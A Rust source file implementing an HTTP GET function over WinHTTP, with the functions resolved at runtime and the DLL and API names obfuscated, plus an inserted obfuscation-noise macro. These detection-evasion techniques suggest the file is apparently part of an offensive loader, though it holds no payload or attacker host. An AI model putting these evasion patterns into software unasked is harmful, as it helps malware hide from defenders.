#![allow(non_snake_case, non_camel_case_types)]

pub fn http_get(url: &str) -> Result<(u16, Vec<u8>), String> {
    use crate::utils::{load_library, get_proc_address};
    use std::ptr::{null, null_mut};
    use std::ffi::c_void;
    use rsl_macros::obfuscation_noise_macro;
    use obfstr::{obfstr, obfbytes};

    // Function definitions
    type WinHttpOpenFn = unsafe extern "system" fn(
        pszAgentW: *const u16,
        dwAccessType: u32,
        pszProxyW: *const u16,
        pszProxyBypassW: *const u16,
        dwFlags: u32
    ) -> *mut c_void;

    type WinHttpConnectFn = unsafe extern "system" fn(
        hSession: *mut c_void,
        pswzServerName: *const u16,
        nServerPort: u16,
        dwReserved: u32
    ) -> *mut c_void;

    type WinHttpOpenRequestFn = unsafe extern "system" fn(
        hConnect: *mut c_void,
        pwszVerb: *const u16,
        pwszObjectName: *const u16,
        pwszVersion: *const u16,
        pwszReferrer: *const u16,
        ppwszAcceptTypes: *const *const u16,
        dwFlags: u32
    ) -> *mut c_void;

    type WinHttpSendRequestFn = unsafe extern "system" fn(
        hRequest: *mut c_void,
        lpszHeaders: *const u16,
        dwHeadersLength: u32,
        lpOptional: *const c_void,
        dwOptionalLength: u32,
        dwTotalLength: u32,
        dwContext: usize
    ) -> i32;

    type WinHttpReceiveResponseFn = unsafe extern "system" fn(
        hRequest: *mut c_void,
        lpReserved: *mut c_void
    ) -> i32;

    type WinHttpQueryHeadersFn = unsafe extern "system" fn(
        hRequest: *mut c_void,
        dwInfoLevel: u32,
        pwszName: *const u16,
        lpBuffer: *mut c_void,
        lpdwBufferLength: *mut u32,
        lpdwIndex: *mut u32
    ) -> i32;

    type WinHttpQueryDataAvailableFn = unsafe extern "system" fn(
        hRequest: *mut c_void,
        lpdwNumberOfBytesAvailable: *mut u32
    ) -> i32;

    type WinHttpReadDataFn = unsafe extern "system" fn(
        hRequest: *mut c_void,
        lpBuffer: *mut c_void,
        dwNumberOfBytesToRead: u32,
        lpdwNumberOfBytesRead: *mut u32
    ) -> i32;

    type WinHttpCloseHandleFn = unsafe extern "system" fn(
        hInternet: *mut c_void
    ) -> i32;

    // Constants
    const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: u32 = 0;
    const WINHTTP_FLAG_SECURE: u32 = 0x00800000;
    const WINHTTP_QUERY_STATUS_CODE: u32 = 19;
    const WINHTTP_QUERY_FLAG_NUMBER: u32 = 0x20000000;

    let (scheme, rest) = url.split_once("://").ok_or("Invalid URL format")?;
    let (host_port, path) = rest.split_once('/').unwrap_or((rest, ""));
    let path = format!("/{}", path);
    let (host, port) = if let Some((h, p)) = host_port.split_once(':') {
        (h, p.parse::<u16>().map_err(|_| "Invalid port")?)
    } else {
        (host_port, if scheme == "https" { 443 } else { 80 })
    };
    let is_ssl = scheme == "https";

    let to_wstring = |s: &str| -> Vec<u16> {
        s.encode_utf16().chain(std::iter::once(0)).collect()
    };

    let user_agent = to_wstring("Mozilla/5.0");
    let host_w = to_wstring(host);
    let path_w = to_wstring(&path);
    let method_w = to_wstring("GET");

    unsafe {
        // Load winhttp.dll
        let winhttp_dll = load_library(obfbytes!(b"winhttp.dll\0").as_slice())?;

        // Resolve functions
        let win_http_open: WinHttpOpenFn = std::mem::transmute(get_proc_address(winhttp_dll, obfbytes!(b"WinHttpOpen\0").as_slice())?);
        let win_http_connect: WinHttpConnectFn = std::mem::transmute(get_proc_address(winhttp_dll, obfbytes!(b"WinHttpConnect\0").as_slice())?);
        let win_http_open_request: WinHttpOpenRequestFn = std::mem::transmute(get_proc_address(winhttp_dll, obfbytes!(b"WinHttpOpenRequest\0").as_slice())?);
        let win_http_send_request: WinHttpSendRequestFn = std::mem::transmute(get_proc_address(winhttp_dll, obfbytes!(b"WinHttpSendRequest\0").as_slice())?);
        let win_http_receive_response: WinHttpReceiveResponseFn = std::mem::transmute(get_proc_address(winhttp_dll, obfbytes!(b"WinHttpReceiveResponse\0").as_slice())?);
        let win_http_query_headers: WinHttpQueryHeadersFn = std::mem::transmute(get_proc_address(winhttp_dll, obfbytes!(b"WinHttpQueryHeaders\0").as_slice())?);
        let win_http_query_data_available: WinHttpQueryDataAvailableFn = std::mem::transmute(get_proc_address(winhttp_dll, obfbytes!(b"WinHttpQueryDataAvailable\0").as_slice())?);
        let win_http_read_data: WinHttpReadDataFn = std::mem::transmute(get_proc_address(winhttp_dll, obfbytes!(b"WinHttpReadData\0").as_slice())?);
        let win_http_close_handle: WinHttpCloseHandleFn = std::mem::transmute(get_proc_address(winhttp_dll, obfbytes!(b"WinHttpCloseHandle\0").as_slice())?);

        let h_session = win_http_open(
            user_agent.as_ptr(),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            null(),
            null(),
            0,
        );
        
        if h_session.is_null() {
             return Err("WinHttpOpen failed".to_string());
        }

        let h_connect = win_http_connect(
            h_session,
            host_w.as_ptr(),
            port,
            0,
        );
        if h_connect.is_null() {
            win_http_close_handle(h_session);
            return Err("WinHttpConnect failed".to_string());
        }

        let flags = if is_ssl { WINHTTP_FLAG_SECURE } else { 0 };
        let h_request = win_http_open_request(
            h_connect,
            method_w.as_ptr(),
            path_w.as_ptr(),
            null(),
            null(),
            null(),
            flags,
        );
        if h_request.is_null() {
            win_http_close_handle(h_connect);
            win_http_close_handle(h_session);
            return Err("WinHttpOpenRequest failed".to_string());
        }

        if win_http_send_request(
            h_request,
            null(),
            0,
            null(),
            0,
            0,
            0,
        ) == 0 {
            win_http_close_handle(h_request);
            win_http_close_handle(h_connect);
            win_http_close_handle(h_session);
            return Err("WinHttpSendRequest failed".to_string());
        }

        if win_http_receive_response(h_request, null_mut()) == 0 {
            win_http_close_handle(h_request);
            win_http_close_handle(h_connect);
            win_http_close_handle(h_session);
            return Err("WinHttpReceiveResponse failed".to_string());
        }

        // Get status code
        let mut status_code: u32 = 0;
        let mut size = std::mem::size_of::<u32>() as u32;
        if win_http_query_headers(
            h_request,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            null(),
            &mut status_code as *mut _ as *mut c_void,
            &mut size,
            null_mut(),
        ) == 0 {
            win_http_close_handle(h_request);
            win_http_close_handle(h_connect);
            win_http_close_handle(h_session);
            return Err("WinHttpQueryHeaders failed".to_string());
        }

        let mut response_body = Vec::new();
        loop {
            let mut size = 0;
            if win_http_query_data_available(h_request, &mut size) == 0 {
                break;
            }
            if size == 0 {
                break;
            }

            let mut buffer = vec![0u8; size as usize];
            let mut read = 0;
            if win_http_read_data(
                h_request,
                buffer.as_mut_ptr() as *mut c_void,
                size,
                &mut read,
            ) == 0 {
                break;
            }
            buffer.truncate(read as usize);
            response_body.extend(buffer);
        }

        win_http_close_handle(h_request);
        win_http_close_handle(h_connect);
        win_http_close_handle(h_session);

        obfuscation_noise_macro!();

        Ok((status_code as u16, response_body))
    }
}
